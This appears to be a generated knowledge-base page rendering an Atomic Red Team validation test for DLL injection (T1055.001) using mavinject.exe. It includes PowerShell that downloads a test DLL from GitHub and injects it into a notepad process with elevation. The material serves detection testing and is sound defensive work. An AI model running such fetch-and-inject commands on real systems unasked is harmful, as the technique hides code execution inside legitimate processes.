---
atomic_guid: "74496461-11a1-4982-b439-4d87a550d254"
title: "Process Injection via mavinject.exe"
framework: "atomic"
generated: "true"
attack_technique_id: "T1055.001"
attack_technique_name: "Process Injection: Dynamic-link Library Injection"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055.001/T1055.001.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "74496461-11a1-4982-b439-4d87a550d254"
  - "Process Injection via mavinject.exe"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Process Injection via mavinject.exe

Windows 10 Utility To Inject DLLS.

Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
With default arguments, expect to see a MessageBox, with notepad's icon in taskbar.

## Metadata

- Atomic GUID: 74496461-11a1-4982-b439-4d87a550d254
- Technique: T1055.001: Process Injection: Dynamic-link Library Injection
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1055.001/T1055.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1055-process_injection|T1055.001]]

## Input Arguments

### dll_payload

- description: DLL to Inject
- type: path
- default: PathToAtomicsFolder\T1055.001\src\x64\T1055.001.dll

### process_id

- description: PID of input_arguments
- type: string
- default: (Start-Process notepad -PassThru).id

## Dependencies

Utility to inject must exist on disk at specified location (#{dll_payload})

### Prerequisite Check

```powershell
if (Test-Path "#{dll_payload}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory (split-path "#{dll_payload}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll" -OutFile "#{dll_payload}"
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
$mypid = #{process_id}
mavinject $mypid /INJECTRUNNING "#{dll_payload}"
Stop-Process -processname notepad
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055.001/T1055.001.yaml)
